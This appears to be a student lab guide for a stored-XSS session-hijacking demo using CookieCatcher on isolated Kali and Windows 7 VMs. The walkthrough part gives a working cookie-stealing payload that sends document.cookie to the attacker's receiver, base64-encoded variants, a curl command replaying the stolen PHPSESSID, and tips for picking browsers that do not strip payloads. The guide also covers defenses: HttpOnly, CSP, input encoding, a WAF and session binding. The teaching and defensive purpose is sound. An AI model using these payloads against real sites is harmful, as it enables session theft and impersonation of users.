# 🧪 Lab Guide — CookieCatcher Attack (Kali → Windows 7)

Step-by-step walkthrough for running the **Session Hijacking / MITM**
attack with **CookieCatcher** in a VirtualBox **NAT Network / private**
lab. Structured to satisfy the 5 documentation requirements in the
project brief.

> 🔄 **Network change note:** an earlier version of this guide used a
> Host-Only adapter (`192.168.56.x`) but produced inconsistent results
> between the two VMs. We switched to a **VirtualBox NAT Network /
> private network** in the `10.0.2.0/24` range — that gave reliable
> VM-to-VM connectivity and reproducible captures. All commands and
> payloads below use the new IPs.

> ⚠️ **Authorized lab use only.** Both VMs must stay on the isolated
> private network. Do not attack systems you do not own.

---

## 🗒️ Brief mapping (the 5 requirements)

| # | Requirement                                | Section below |
|---|--------------------------------------------|---------------|
| 1 | Who is involved (attacker & victim)        | §1            |
| 2 | When to conduct the attack                 | §2            |
| 3 | OS / platform / host (attacker & victim)   | §3            |
| 4 | Steps of the attack                        | §5–§9         |
| 5 | How many trials taken                      | §10           |

Plus: tool justification (§4) and defense simulation (§11).

---

## 1. Who is involved

| Role     | Identity      | IP address  | Function                                  |
|----------|---------------|-------------|-------------------------------------------|
| Attacker | Kali Linux VM | `10.0.2.3`  | Hosts CookieCatcher + the vulnerable app  |
| Victim   | Windows 7 VM  | `10.0.2.15` | Browses the vulnerable page, gets cookies stolen |

For a clean academic story, treat the Kali box as both the **malicious
infrastructure** (CookieCatcher receiver) **and** the **vulnerable web
server** the victim visits — this avoids needing a third VM. In a real
attack these would be separate machines.

### Network topology

```
        ┌──────────────────────────────────────────┐
        │  VirtualBox NAT Network (10.0.2.0/24)    │
        │                                          │
        │   ┌────────────────┐    ┌─────────────┐  │
        │   │ Kali (attacker)│    │ Win 7 (vic) │  │
        │   │   10.0.2.3     │◄──►│  10.0.2.15  │  │
        │   │  :8001 vuln    │    │  browser    │  │
        │   │  :8002 secure  │    │             │  │
        │   │  :8080 catcher │    │             │  │
        │   └────────────────┘    └─────────────┘  │
        └──────────────────────────────────────────┘
```

---

## 2. When to conduct the attack

- **Trigger condition:** the victim has an authenticated session on the
  target site (a `PHPSESSID` cookie is set).
- **Pre-conditions on the target:**
  - No input sanitization (XSS is possible)
  - Cookie missing the `HttpOnly` flag
  - No Content-Security-Policy header
- **Window of exploitation:** as long as the session cookie is valid
  (default PHP session lifetime ~24 minutes idle).
- **Lab schedule (example):** demo session, **15:00–15:30**, after both
  VMs have booted and the connectivity check (§3.4) passes.

---

## 3. OS / platform / host

### 3.1 VirtualBox network configuration (do this FIRST)

This is the change that fixed the previous lab issues. In VirtualBox:

1. **File → Tools → Network Manager → NAT Networks → Create**
   - Name: `LabNet` (any name)
   - Network CIDR: `10.0.2.0/24`
   - DHCP: **Enable**
2. For **both VMs** → Settings → Network → Adapter 1:
   - Attached to: **NAT Network**
   - Name: `LabNet`
3. Boot both VMs. They should automatically receive `10.0.2.x` addresses.
4. Pin the IPs (recommended) by using static config inside each guest, or
   by reserving DHCP leases, so the attacker is always `10.0.2.3` and
   the victim is always `10.0.2.15`.

> Why not Host-Only? Host-Only gave inconsistent capture results in our
> earlier trials (the Win 7 VM sometimes refused outbound traffic on the
> non-default adapter). NAT Network keeps both VMs on a real layer-2
> segment with proper DHCP and stable VM-to-VM routing.

### 3.2 Attacker — Kali Linux (`10.0.2.3`)
- OS: Kali Linux 2023.x or newer
- Required: PHP 7.4+ (`php -v`), `git`
- Roles served on this VM:
  - `:8001` → Vulnerable guestbook (the target site)
  - `:8002` → Secure guestbook (for the defense simulation)
  - `:8080` → CookieCatcher receiver

### 3.3 Victim — Windows 7 (`10.0.2.15`)
- OS: Windows 7 SP1 (32 or 64 bit)
- Browser: **Internet Explorer 11** (recommended — no XSS auditor),
  or older Firefox / Chrome.

### 3.4 Connectivity check (run before every demo)

On Kali:
```bash
ip a | grep 10.0.2          # confirm 10.0.2.3
ping -c 3 10.0.2.15         # confirm Win 7 reachable
```

On Win 7 (Command Prompt):
```cmd
ipconfig                    :: confirm 10.0.2.15
ping 10.0.2.3               :: confirm Kali reachable
```

Both pings must succeed before continuing.

---

## 4. Justification — why CookieCatcher

| Criterion             | CookieCatcher       | BeEF      | Custom script |
|-----------------------|---------------------|-----------|---------------|
| Setup complexity      | Very low (PHP only) | High      | Medium        |
| Demonstrates concept  | Excellent           | Excellent | Depends       |
| Educational clarity   | High                | Medium    | Low           |
| Resource footprint    | < 1 MB              | ~200 MB   | Varies        |
| Fits assignment scope | ✅                  | Overkill  | ✅            |

CookieCatcher is the right tool for a focused, reproducible academic
demo of session hijacking via XSS.

---

## 5. STEP 1 — Get the demo code on Kali

```bash
sudo apt update && sudo apt install -y php-cli git

cd ~
git clone https://github.com/KarlTheforest/session-hijacking-project.git
cd session-hijacking-project/demo-environment
```

You now have:
- `vulnerable-app/index.php` — the target page
- `attacker/cookiecatcher.php` — the cookie receiver
- `attacker/xss-payloads.txt` — ready-made payloads
- `secure-app/` — the hardened version (used in §11)

---

## 6. STEP 2 — Start the servers on Kali

Open **two terminals** on Kali (both inside `demo-environment/`):

**Terminal A — CookieCatcher (attacker receiver)**
```bash
php -S 0.0.0.0:8080 -t attacker attacker/cookiecatcher.php
```
Expected output:
```
PHP X.Y.Z Development Server (http://0.0.0.0:8080) started
```

**Terminal B — Vulnerable guestbook (target)**
```bash
php -S 0.0.0.0:8001 -t vulnerable-app
```

Smoke test from Kali:
```bash
curl -s -o /dev/null -w "vuln  %{http_code}\n" http://10.0.2.3:8001
curl -s -o /dev/null -w "catch %{http_code}\n" http://10.0.2.3:8080
```
Both must return `200`.

---

## 7. STEP 3 — Confirm vulnerability from the victim (Win 7)

On the **Win 7 VM**, open Internet Explorer 11 and go to:
```
http://10.0.2.3:8001
```
You should see "Vulnerable Guestbook (LAB ONLY)" with a session cookie
shown on the page.

Open the developer tools (**F12**) → **Console** → type:
```js
document.cookie
```
You should see `PHPSESSID=...` printed back. That proves the cookie has
**no** `HttpOnly` flag, so JavaScript can steal it.

---

## 8. STEP 4 — Inject the XSS payload

Still on **Win 7**, in the comment box of the vulnerable guestbook,
paste this **exact** payload (already targets your Kali IP):

```html
<img src=x onerror="this.src='http://10.0.2.3:8080/?c='+document.cookie">
```

Click **Submit**, then **reload the page** (F5) so the stored payload
fires.

What happens behind the scenes:
1. Browser tries to load image `src=x` → fails.
2. `onerror` JavaScript runs.
3. The browser sends `document.cookie` to
   `http://10.0.2.3:8080/?c=...`
4. CookieCatcher logs the request and returns a 1×1 GIF (no visible
   indication for the victim).

---

## 9. STEP 5 — Capture and replay the session (the hijack)

### 9.1 View the capture on Kali
- **Terminal A** (CookieCatcher) prints:
  ```
  === COOKIE CAPTURED ===
  TIME       : 2026-05-31 15:07:42
  SOURCE_IP  : 10.0.2.15
  USER_AGENT : Mozilla/5.0 (Windows NT 6.1; ...) Trident/7.0
  COOKIE     : PHPSESSID=abc123xyz789
  =======================
  ```
- Or open the dashboard in a Kali browser:
  `http://10.0.2.3:8080`

Note the captured value, e.g. `PHPSESSID=abc123xyz789`.

### 9.2 Replay the cookie (impersonate the victim) — from Kali
```bash
curl -i -b "PHPSESSID=abc123xyz789" http://10.0.2.3:8001
```
The response body shows the page rendered **as the victim** (same
`username` and `session_id` as on Win 7).

You can also use a Kali browser:
1. Open `http://10.0.2.3:8001`
2. DevTools → Application → Cookies → set
   `PHPSESSID = abc123xyz789` → reload.

✅ **Session hijacked — without ever knowing the victim's password.**

---

## 10. Trials & evidence to record

Run the attack at least 3 times so you can show repeatability and
edge cases. Suggested trial table:

| Trial | Payload                                          | Result        | Notes                  |
|-------|--------------------------------------------------|---------------|------------------------|
| 1     | `<script>...document.cookie</script>`            | varies        | tests basic filters    |
| 2     | `<img src=x onerror="...document.cookie">`       | ✅ stolen     | recommended payload    |
| 3     | `<img src=x onerror="...btoa(document.cookie)">` | ✅ stolen     | base64 encoded         |
| 4     | Same payload **on the secure app** (§11)         | ❌ blocked    | proves the defense     |
| 5     | Replay stolen cookie from Kali                   | ✅ hijack     | impersonation works    |

For each trial, capture **screenshots** of:
1. Vulnerable page on Win 7 with the payload submitted.
2. CookieCatcher terminal showing the captured cookie.
3. CookieCatcher dashboard (`:8080`) entry.
4. Kali browser/cURL showing access **as the victim**.
5. Secure app rejecting the same payload (for trial 4).

---

## 11. Defense simulation (required by the brief)

Start the hardened version on Kali:
```bash
php -S 0.0.0.0:8002 -t secure-app
```
On Win 7, browse to `http://10.0.2.3:8002` and repeat **STEP 4** with
the same payload. Observe:

| Layer              | What you should see                                    |
|--------------------|--------------------------------------------------------|
| #1 HttpOnly cookie | `document.cookie` no longer shows `PHPSESSID`          |
| #2 CSP             | Browser console: "Refused to execute inline ..."       |
| #3 Input encoding  | If stored, payload renders as text, not executed        |
| #4 WAF filter      | POST returns **HTTP 403 — blocked by WAF**             |
| #5 Session binding | Replaying the cookie from Kali → **HTTP 403**          |

Confirm CookieCatcher (`:8080`) logs **no new entry** for the secure app.

---

## 12. Cleanup

In each Kali server terminal: **Ctrl+C** to stop.

Reset demo state between runs:
```bash
rm -f vulnerable-app/comments.txt \
      secure-app/comments.txt \
      attacker/captured_cookies.log
```

---

## 13. Troubleshooting

- **No capture appears** → use the literal IP `10.0.2.3` in the payload
  (not `localhost` or `127.0.0.1`); confirm Win 7 can `ping 10.0.2.3`.
- **`Connection refused` from Win 7** → the PHP server must be bound to
  `0.0.0.0`, not `127.0.0.1`. Double-check your `php -S` flag.
- **Kali firewall** blocks ports →
  `sudo ufw allow 8001,8080,8002/tcp`.
- **Browser silently strips the payload** → Chrome/Edge run an XSS
  auditor. Use **IE 11** on Win 7, or older Firefox, for the demo.
- **Cookie not set on secure app over plain HTTP** → the secure app
  intentionally calls `SecureSession::start(false)` to allow HTTP for
  the demo. In production set it to `true` and serve over HTTPS.
- **VMs can't reach each other** → confirm both adapters are attached to
  the *same* NAT Network (§3.1), not just "NAT". Reboot if you switched.

---

## 14. Quick checklist for your report

- [ ] Network diagram showing `10.0.2.3` ↔ `10.0.2.15` (NAT Network)
- [ ] Tool justification (§4 table)
- [ ] All five "who/when/OS/steps/trials" requirements answered
- [ ] At least 3 attack trials with screenshots
- [ ] Defense simulation results (§11 table)
- [ ] Ethical statement: lab-only, isolated NAT Network, authorized
